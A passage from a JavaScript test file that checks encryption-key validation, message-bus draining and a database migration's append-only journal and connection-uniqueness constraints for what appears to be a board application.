  assert.throws(() => loadKey({ env: { BOARD_ENC_KEY: `${b64.slice(0, 20)}!!${b64.slice(20)}` }, hasParentPort: false }), /32 bytes/);
  assert.throws(() => loadKey({ env: { BOARD_ENC_KEY: b64.replace('=', '') }, hasParentPort: false }), /32 bytes/);
  assert.equal(loadKey({ env: { BOARD_ENC_KEY: b64 }, hasParentPort: false }).toString('base64'), b64);
});

test('L6: bus.poke never drains inside the committer', async () => {
  const db = openDb(':memory:');
  const bus = createBus({ db, timers: manualTimers() });
  const got = [];
  bus.subscribe('c', (r) => { got.push(r.seq); });
  await bus.settle();
  db.run("INSERT INTO journal (board_id, at_hub, actor_kind, kind, payload) VALUES (NULL, ?, 'system', 'x', '{}')", new Date().toISOString());
  bus.poke();
  await Promise.resolve();
  assert.deepEqual(got, []);
  await bus.settle();
  assert.equal(got.length, 1);
});

test('migration 008: journal accepts actor_kind integration and stays append-only; connections unique per org among live rows', () => {
  const db = openDb(':memory:');
  const t = new Date().toISOString();
  db.run("INSERT INTO journal (at_hub, actor_kind, actor_id, kind) VALUES (?, 'integration', 'conn-1', 'card.create')", t);
  assert.throws(() => db.run("INSERT INTO journal (at_hub, actor_kind, kind) VALUES (?, 'robot', 'x')", t), /CHECK/);
  assert.throws(() => db.run("UPDATE journal SET kind = 'y'"), /append-only/);
  assert.throws(() => db.run('DELETE FROM journal'), /append-only/);
  db.run("INSERT INTO orgs (id, name, created_at) VALUES ('o1', 'A', ?), ('o2', 'B', ?)", t, t);
  db.run("INSERT INTO connections (id, org_id, provider, external_id, status, created_at) VALUES ('c1', 'o1', 'slack', 'T1', 'revoked', ?)", t);
  db.run("INSERT INTO connections (id, org_id, provider, external_id, created_at) VALUES ('c2', 'o1', 'slack', 'T1', ?)", t);
  db.run("INSERT INTO connections (id, org_id, provider, external_id, created_at) VALUES ('c3', 'o2', 'slack', 'T1', ?)", t);
  assert.throws(() => db.run("INSERT INTO connections (id, org_id, provider, external_id, created_at) VALUES ('c4', 'o1', 'slack', 'T1', ?)", t), /UNIQUE|a live connection is never replaced/);
  assert.throws(() => db.run("INSERT INTO integration_audit (id, connection_id, action, decision, at) VALUES ('a', 'c2', 'x', 'bogus', ?)", t), /CHECK/);
  db.run("INSERT INTO integration_audit (id, connection_id, action, decision, error, at) VALUES ('a', 'c2', 'x', 'failed', 'timeout', ?)", t);
});
